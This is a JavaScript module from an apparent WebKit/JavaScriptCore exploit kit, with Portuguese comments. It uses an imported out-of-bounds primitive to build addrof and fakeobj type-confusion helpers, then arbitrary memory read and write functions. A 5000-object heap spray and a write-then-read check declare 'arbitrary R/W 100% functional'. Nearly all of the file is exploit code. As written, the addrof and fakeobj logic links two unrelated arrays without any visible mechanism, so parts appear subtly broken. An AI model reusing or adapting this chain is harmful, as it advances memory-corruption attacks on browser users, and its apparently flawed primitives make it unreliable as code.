// js/script3/testArrayBufferVictimCrash.mjs (v101 - R60 Final com Estabilização e Verificação de L/E Aprimorada)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ:
// - Aumento do volume do 'object spray' para melhor estabilização do heap.
// - Logs mais detalhados em pontos críticos para depuração e verificação.
// - Verificações de sanidade adicionais em primitivas addrof/fakeobj.
// - Re-inicialização e limpeza mais explícitas do ambiente OOB.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment // Importa a função de limpeza
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v101_R60_Enhanced";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    logS3(`[Conv] Int64(${int64.toString(true)}) -> Double: ${f64[0]}`, "debug");
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    const resultInt64 = new AdvancedInt64(u32[0], u32[1]);
    logS3(`[Conv] Double(${double}) -> Int64: ${resultInt64.toString(true)} (low: 0x${u32[0].toString(16)}, high: 0x${u32[1].toString(16)})`, "debug");
    return resultInt64;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação Aprimorada ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };
    let spray_objects = []; // Manter spray global para maior persistência

    try {
        logS3("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpeza explícita

        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        logS3("Chamando triggerOOB_primitive para configurar o ambiente OOB...", "info");
        await triggerOOB_primitive({ force_reinit: true }); // Garante re-inicialização
        if (!getOOBDataView()) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logS3(errMsg, "critical");
            throw new Error(errMsg);
        }
        logS3(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}`, "good");

        // === Definição das arrays para Type Confusion ===
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];

        logS3(`Array 'confused_array' inicializado: [${confused_array[0]}]`, "debug");
        logS3(`Array 'victim_array' inicializado: [${JSON.stringify(victim_array[0])}]`, "debug");

        const addrof = (obj) => {
            logS3(`[addrof] Tentando obter endereço de: ${obj}`, "debug");
            victim_array[0] = obj;
            const addr = doubleToInt64(confused_array[0]);
            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
                logS3(`[addrof] ALERTA: Endereço retornado para ${obj} (${addr.toString(true)}) parece inválido.`, "warn");
                // Poderíamos tentar um retry aqui ou falhar mais cedo, para robustez, falharemos cedo.
                throw new Error(`Addrof retornou endereço inválido para ${obj}.`);
            }
            logS3(`[addrof] Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug");
            return addr;
        };

        const fakeobj = (addr) => {
            logS3(`[fakeobj] Tentando forjar objeto no endereço: ${addr.toString(true)}`, "debug");
            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
                 logS3(`[fakeobj] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido.`, "error");
                 throw new Error(`Endereço inválido fornecido para fakeobj.`);
            }
            confused_array[0] = int64ToDouble(addr);
            const obj = victim_array[0];
            if (obj === undefined || obj === null) {
                logS3(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser inválido.`, "warn");
            }
            logS3(`[fakeobj] Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug");
            return obj;
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais e com validações básicas.", "good");

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        logS3(`Objeto 'leaker' inicializado: ${JSON.stringify(leaker)}`, "debug");

        const leaker_addr = addrof(leaker);
        logS3(`Endereço de 'leaker' obtido: ${leaker_addr.toString(true)}`, "info");

        // Offset comum da primeira propriedade (JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET é 0x10)
        const val_prop_addr = leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
        logS3(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do leaker_addr)`, "info");

        const arb_read_final = (addr) => {
            logS3(`[ARB_READ] Tentando ler de endereço ${addr.toString(true)}`, "debug");
            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
                logS3(`[ARB_READ] ERRO: Endereço inválido para leitura arbitrária: ${addr.toString(true)}`, "error");
                throw new Error("Endereço inválido para leitura arbitrária.");
            }
            leaker.obj_prop = fakeobj(addr);
            const value = doubleToInt64(leaker.val_prop);
            logS3(`[ARB_READ] Valor lido de ${addr.toString(true)}: ${value.toString(true)}`, "debug");
            return value;
        };

        const arb_write_final = (addr, value) => {
            logS3(`[ARB_WRITE] Tentando escrever valor ${value.toString(true)} no endereço ${addr.toString(true)}`, "debug");
            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
                logS3(`[ARB_WRITE] ERRO: Endereço inválido para escrita arbitrária: ${addr.toString(true)}`, "error");
                throw new Error("Endereço inválido para escrita arbitrária.");
            }
            if (!isAdvancedInt64Object(value)) {
                logS3(`[ARB_WRITE] ALERTA: Valor para escrita não é AdvancedInt64, convertendo: ${value}`, "warn");
                value = new AdvancedInt64(value);
            }
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
            logS3(`[ARB_WRITE] Escrita concluída no endereço ${addr.toString(true)}.`, "debug");
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
        logS3("Iniciando spray de objetos (volume aumentado) para estabilização de heap...", "info");
        // Aumentado para 5000 para maior robustez na estabilização
        for (let i = 0; i < 5000; i++) {
            spray_objects.push({ a: 0xDEADBEEF + i, b: 0xCAFEBABE + i, c: "spray_data_" + i });
        }
        const test_obj = spray_objects[2500]; // Pega um objeto do meio do spray
        logS3(`Spray de ${spray_objects.length} objetos concluído para estabilização. Objeto de teste escolhido (índice 2500): ${JSON.stringify(test_obj)}`, "info");

        // 2. Teste de Escrita e Leitura
        logS3("Iniciando teste funcional de Leitura/Escrita Arbitrária no objeto de spray...", "info");
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste (${JSON.stringify(test_obj)}): ${test_obj_addr.toString(true)}`, "info");

        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        logS3(`Valor a ser escrito para o teste: ${value_to_write.toString(true)}`, "info");
        
        // Endereço da propriedade 'a' do test_obj.
        // Assumindo que 'a' é a primeira propriedade inline, offset 0x10.
        const prop_a_addr = test_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
        logS3(`Endereço calculado da propriedade 'a' do test_obj: ${prop_a_addr.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do test_obj_addr)`, "info");
        
        logS3(`Executando arb_write_final: escrevendo ${value_to_write.toString(true)} no endereço ${prop_a_addr.toString(true)}...`, "info");
        arb_write_final(prop_a_addr, value_to_write);
        logS3(`Escrita do valor de teste concluída.`, "info");

        logS3(`Executando arb_read_final: lendo do endereço ${prop_a_addr.toString(true)}...`, "info");
        const value_read = arb_read_final(prop_a_addr);
        logS3(`Leitura do valor de teste concluída.`, "info");
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        // Limpeza final do ambiente OOB e spray de objetos para evitar interferências
        logS3(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        spray_objects = []; // Limpa as referências para permitir que o GC os colete
        logS3(`Limpeza final concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logS3(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified) Enhanced' }
    };
}
